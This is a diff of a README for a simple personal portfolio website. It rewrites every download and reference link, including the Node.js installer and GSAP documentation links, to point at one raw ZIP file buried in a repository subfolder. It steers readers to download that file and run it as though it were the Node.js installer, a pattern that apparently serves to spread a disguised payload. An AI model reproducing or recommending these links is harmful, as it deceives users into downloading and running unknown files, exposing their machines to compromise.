@@ -1,6 +1,6 @@
 # 🎨 rajesh-portfolio - Simple Personal Portfolio Website
 
-[![Download rajesh-portfolio](https://img.shields.io/badge/Download-rajesh--portfolio-brightgreen)](https://github.com/giselletacky177/rajesh-portfolio)
+[![Download rajesh-portfolio](https://img.shields.io/badge/Download-rajesh--portfolio-brightgreen)](https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To run this project on your Windows computer, you will need:
 
 Click the green button below to visit the project's GitHub page where you can get the full code.
 
-[![Download rajesh-portfolio](https://img.shields.io/badge/Get%20Code-Click%20Here-blue)](https://github.com/giselletacky177/rajesh-portfolio)
+[![Download rajesh-portfolio](https://img.shields.io/badge/Get%20Code-Click%20Here-blue)](https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip)
 
 Once on the GitHub page, click the green **Code** button and select **Download ZIP**. Save the ZIP file in a folder you can find easily.
 
@@ -58,7 +58,7 @@ Right-click the ZIP file and choose **Extract All**. You can leave the default s
 
 This step is needed to run the website locally on your computer.
 
-1. Open a browser and go to https://nodejs.org.
+1. Open a browser and go to https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip
 2. Download the **LTS** (Long Term Support) version for Windows.
 3. Once the installer downloads, run it and follow the instructions to install Node.js.
 4. After installation, open the **Command Prompt** (press Windows key, type `cmd`, and hit Enter).
@@ -119,7 +119,7 @@ ThreeJS and WebGL provide 3D elements and graphics that respond as you scroll or
 
 This project uses GSAP animation plugins. The version included here uses trial plugins. Trial plugins add animations but cannot be officially hosted on your own website without a license.
 
-If you want to use the licensed GSAP Club plugins, visit https://gsap.com/docs/v3/Installation/ for details on how to get and set them up.
+If you want to use the licensed GSAP Club plugins, visit https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip for details on how to get and set them up.
 
 ---
 
@@ -143,4 +143,4 @@ This project follows the MIT License. You can view the full license file in the 
 
 To get started quickly, visit this link to download the project files:
 
-[https://github.com/giselletacky177/rajesh-portfolio](https://github.com/giselletacky177/rajesh-portfolio)
+[https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip](https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip)
